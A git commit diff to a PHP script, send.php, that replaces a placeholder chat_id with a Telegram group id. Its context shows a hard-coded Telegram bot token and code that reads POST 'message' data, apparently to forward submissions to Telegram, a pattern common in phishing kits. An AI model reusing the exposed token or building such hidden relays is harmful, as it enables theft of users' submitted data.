851cfec6371151790699b743a69e492990983a5a
sedo2000 <sydwbydw@gmail.com>
2025-09-11 00:03:17 +0300

    Update send.php

--- send.php
+++ send.php
@@ -1,6 +1,6 @@
 <?php
 $token = "7482818508:AAE0HJwhkXcyGRGnmsE8Ahgnrf5N9n1mL1g";
-$chat_id = "IPADDRESSBSG";
+$chat_id = "-1002680545996";
 
 $message = isset($_POST['message']) ? $_POST['message'] : "No data";
 
